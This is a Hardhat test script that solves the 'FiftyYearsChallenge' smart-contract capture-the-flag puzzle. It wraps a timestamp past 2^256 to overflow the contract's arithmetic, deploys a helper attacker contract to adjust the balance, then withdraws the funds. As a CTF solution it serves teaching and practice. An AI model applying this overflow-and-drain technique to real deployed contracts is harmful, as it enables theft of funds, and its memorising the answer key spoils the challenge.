const { loadFixture } = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { expect } = require("chai");
const { fixtureFactory } = require("../utils");

it("Solves FiftyYearsChallenge", async function () {
  const [attacker] = await ethers.getSigners();
  const fixture = () => fixtureFactory("FiftyYearsChallenge", ethers.parseEther("1.0"), attacker);
  const contract = await loadFixture(fixture);

  const ONE_DAY_IN_SECONDS = BigInt(24*60*60);
  console.log(await contract.head());
  await contract.upsert(1, BigInt(2**256) - ONE_DAY_IN_SECONDS, {value: 1});
  console.log(await contract.head());

  await contract.upsert(2, 0, {value: 2});
  console.log(await contract.head());

  console.log(await contract.runner.provider.getBalance(await contract.getAddress()));
  console.log(await contract.head());

  const address = await contract.getAddress();
  const attackerFixture = () => fixtureFactory("FiftyYearsChallengeAttacker", 2, address);
  await loadFixture(attackerFixture);

  await contract.withdraw(2);

  expect(await contract.isComplete()).to.equal(true);
});
